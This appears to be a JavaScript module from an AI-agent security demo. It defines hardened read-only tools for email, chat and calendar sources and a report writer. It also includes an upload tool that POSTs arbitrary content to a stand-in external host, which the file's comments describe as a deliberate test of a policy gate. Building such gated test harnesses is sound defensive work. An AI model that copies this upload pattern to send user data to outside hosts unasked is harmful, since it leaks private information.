import { mkdir, open, realpath } from "node:fs/promises";
import { constants } from "node:fs";
import { join } from "node:path";
// Fixed GET-only source tools. OpenShell supplies the provider placeholder and
// injects the credential; source text never selects a host, method or token.
async function read(url, { headers = {}, format = "json" } = {}) {
  const response = await fetch(url, { method: "GET", headers, redirect: "error", signal: AbortSignal.timeout(15000) });
  if (!response.ok) throw new Error(`Source read failed: HTTP ${response.status}`);
  const text = await response.text();
  if (text.length > 1_000_000) throw new Error("Source response exceeds the demo read limit");
  return format === "text" ? text : JSON.parse(text);
}

export function createSourceTools(config, dependencies = {}) {
  const { clusterDomain, demoId, tenantUser } = config;
  if (!/^[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?$/.test(clusterDomain || "") ||
      !/^[a-z0-9][a-z0-9-]{0,30}$/.test(demoId || "") ||
      (!/^[a-z][a-z0-9-]{0,18}$/.test(tenantUser || "") || demoId !== tenantUser)) {
    throw new Error("Invalid source-reader configuration");
  }
  const fetchSource = dependencies.read || read;
  let pendingRead = Promise.resolve();
  // Keycloak's brute-force protection rejects overlapping logins for one user.
  const get = (...args) => {
    const request = pendingRead.then(() => fetchSource(...args));
    pendingRead = request.catch(() => {});
    return request;
  };
  const env = dependencies.env || process.env;
  const base = name => `https://${name}-ui-openshell-agents.apps.${clusterDomain}`;
  const prefix = `[SAW:${demoId}] `;
  const sourceHeaders = name => {
    const placeholder = env[name];
    if (!placeholder) throw new Error("Source provider placeholder is unavailable");
    return { Authorization: placeholder };
  };
  const tool = (name, description, run, acceptsContent = false) => ({
    name, description,
    inputSchema: { type: "object", properties: acceptsContent ? {
      content: { type: "string", minLength: 1, maxLength: 20000 },
    } : {}, ...(acceptsContent ? { required: ["content"] } : {}), additionalProperties: false },
    async run(args = {}) {
      if (acceptsContent) {
        if (!args || Object.keys(args).length !== 1 || typeof args.content !== "string" ||
            !args.content.trim() || Buffer.byteLength(args.content) > 20000) {
          throw new Error("Tool arguments must contain only nonempty content, up to 20000 UTF-8 bytes");
        }
      } else if (!args || typeof args !== "object" || Array.isArray(args) || Object.keys(args).length) {
        throw new Error("Source readers accept no arguments; their scope is fixed by the operator");
      }
      const data = await run(args);
      return { sourceContentIsUntrusted: true, ...data };
    },
  });
  return [
    tool("saw_read_email", "Read the assigned demo email list and message bodies", async () => {
      const messages = [];
      const headers = sourceHeaders("MAILPIT_AUTHORIZATION");
      let start = 0;
      for (let page = 0; page < 20; page++) {
        const batch = await get(`${base("mailpit")}/api/v1/messages?start=${start}&limit=100`, { headers });
        if (!Array.isArray(batch.messages) || !Number.isInteger(batch.total)) throw new Error("Invalid Mailpit response");
        for (const item of batch.messages.filter(m => typeof m.Subject === "string" && m.Subject.startsWith(prefix))) {
          if (messages.length >= 50) throw new Error("More than 50 assigned emails; narrow the operator's fixture set");
          const url = `${base("mailpit")}/api/v1/message/${encodeURIComponent(item.ID)}`;
          const message = await get(url, { headers });
          if (typeof message.Subject !== "string" || !message.Subject.startsWith(prefix)) throw new Error("Mailpit message scope changed");
          messages.push({ id: item.ID, subject: message.Subject, from: message.From, received: message.Date,
            body: String(message.Text || "").slice(0, 10000), url });
        }
        start += batch.messages.length;
        if (start >= batch.total) return { source: "email", messages };
        if (!batch.messages.length) throw new Error("Incomplete Mailpit pagination");
      }
      throw new Error("Mailpit pagination exceeds the demo read limit");
    }),
    tool("saw_read_chat", "Read the latest messages from the assigned ai-platform chat channel", async () => {
      const placeholder = env.MM_TOKEN || env.MATTERMOST_TOKEN;
      if (!placeholder) throw new Error("Mattermost provider placeholder is unavailable");
      const headers = { Authorization: `Bearer ${placeholder}` };
      const teams = await get(`${base("mattermost")}/api/v4/users/me/teams`, { headers });
      const team = Array.isArray(teams) && teams.find(t => t.name === tenantUser && t.type === "I");
      if (!team) throw new Error("Mattermost assigned private team is unavailable");
      const channel = await get(`${base("mattermost")}/api/v4/teams/${encodeURIComponent(team.id)}/channels/name/ai-platform`, { headers });
      if (!/^[a-z0-9]{26}$/.test(channel?.id || "")) throw new Error("Invalid assigned channel");
      const assignedChannel = channel.id;
      const url = `${base("mattermost")}/api/v4/channels/${assignedChannel}/posts?per_page=100&page=0`;
      const data = await get(url, { headers });
      if (!Array.isArray(data.order) || !data.posts) throw new Error("Invalid Mattermost response");
      return { source: "chat", channelId: assignedChannel, url, limit: 100, messages: data.order.map(id => {
        const post = data.posts[id];
        if (!post) throw new Error("Incomplete Mattermost response");
        return { id, text: String(post.message || "").slice(0, 10000), createdAt: post.create_at };
      }) };
    }),
    tool("saw_read_calendar", "Read the assigned demo calendar events and their UTC timestamps", async () => {
      const url = `${base("radicale")}/${tenantUser}/${demoId}/`;
      const calendar = await get(url, { format: "text", headers: sourceHeaders("CALENDAR_AUTHORIZATION") });
      if (typeof calendar !== "string" || !calendar.includes("BEGIN:VCALENDAR") || calendar.length > 100000) {
        throw new Error("Invalid or oversized calendar response");
      }
      return { source: "calendar", url, calendar };
    }),
    tool("saw_save_report", "Save a cited Markdown research report as inference-serving-report.md in the workspace", async ({ content }) => {
      const directory = dependencies.reportDirectory || "/sandbox/.openclaw/workspace";
      await mkdir(directory, { recursive: true });
      if (await realpath(directory) !== directory) throw new Error("Report directory must not be a symlink");
      const path = join(directory, "inference-serving-report.md");
      const file = await open(path, constants.O_WRONLY | constants.O_CREAT | constants.O_NOFOLLOW | constants.O_NONBLOCK, 0o600);
      try {
        const stat = await file.stat();
        if (!stat.isFile() || stat.nlink !== 1) throw new Error("Report must be a regular file with one link");
        await file.truncate(0);
        await file.writeFile(content, "utf8");
      } finally { await file.close(); }
      return { path, content, bytes: Buffer.byteLength(content) };
    }, true),
    // Intentionally has no allow rule: an attempted upload must reach the gate.
    // If policy changes independently, OpenShell still governs this fixed host.
    tool("saw_upload_summary", "Request an external upload of a synthetic briefing summary; requires separate user authorization and workspace policy", async ({ content }) => {
      const response = await (dependencies.fetch || fetch)("https://compliance-sync.example.invalid/collect", {
        method: "POST", headers: { "Content-Type": "text/plain; charset=utf-8" },
        body: content, redirect: "error", signal: AbortSignal.timeout(5000),
      });
      if (!response.ok) throw new Error(`Summary upload failed: HTTP ${response.status}`);
      return { uploaded: true };
    }, true),
  ];
}
